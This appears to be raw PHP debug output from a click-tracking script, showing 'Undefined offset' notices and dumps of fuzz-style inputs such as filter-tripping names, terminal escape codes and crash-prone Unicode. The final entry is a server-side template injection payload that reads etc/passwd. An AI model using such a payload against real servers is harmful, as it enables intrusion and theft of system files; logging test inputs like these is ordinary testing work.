+  string(0) ""
+  [1]=>
+  string(27) "Lightwater%20Country%20Park"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(17) "Jimmy%20Clitheroe"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(17) "Horniman%20Museum"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(19) "shitake%20mushrooms"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(20) "RomansInSussex.co.uk"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(5) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "http:"
+  [2]=>
+  string(0) ""
+  [3]=>
+  string(13) "www.cum.qc.ca"
+  [4]=>
+  string(0) ""
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(41) "Craig%20Cockburn,%20Software%20Specialist"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(16) "Linda%20Callahan"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(28) "Dr.%20Herman%20I.%20Libshitz"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(19) "magna%20cum%20laude"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(18) "Super%20Bowl%20XXX"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(35) "medieval%20erection%20of%20parapets"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(8) "evaluate"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "mocha"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(10) "expression"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(15) "Arsenal%20canal"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(7) "classic"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(11) "Tyson%20Gay"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(17) "Dick%20Van%20Dyke"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(8) "basement"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(293) "If%20you're%20reading%20this,%20you've%20been%20in%20a%20coma%20for%20almost%2020%20years%20now.%20We're%20trying%20a%20new%20technique.%20We%20don't%20know%20where%20this%20message%20will%20end%20up%20in%20your%20dream,%20but%20we%20hope%20it%20works.%20Please%20wake%20up,%20we%20miss%20you."
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(104) "Roses%20are%20%1B[0;31mred%1B[0m,%20violets%20are%20%1B[0;34mblue.%20Hope%20you%20enjoy%20terminal%20hue"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(55) "But%20now...%1B[20Cfor%20my%20greatest%20trick...%1B[8m"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(90) "The%20quic%08%08%08%08%08%08k%20brown%20fo%07%07%07%07%07%07%07%07%07%07%07x...%20[Beeeep]"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(171) "Power%D9%84%D9%8F%D9%84%D9%8F%D8%B5%D9%91%D8%A8%D9%8F%D9%84%D9%8F%D9%84%D8%B5%D9%91%D8%A8%D9%8F%D8%B1%D8%B1%D9%8B%20%E0%A5%A3%20%E0%A5%A3h%20%E0%A5%A3%20%E0%A5%A3%E5%86%97"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(34) "%F0%9F%8F%B30%F0%9F%8C%88%EF%B8%8F"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(45) "%E0%B0%9C%E0%B1%8D%E0%B0%9E%E2%80%8C%E0%B0%BE"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(24) "%DA%AF%DA%86%D9%BE%DA%98"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================400 Bad Request=============================array(4) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(61) "%7B%7B%20%22%22.__class__.__mro__[2].__subclasses__()[40](%22"
+  [2]=>
+  string(3) "etc"
+  [3]=>
+  string(26) "passwd%22).read()%20%7D%7D"
+}
+No record found=============================
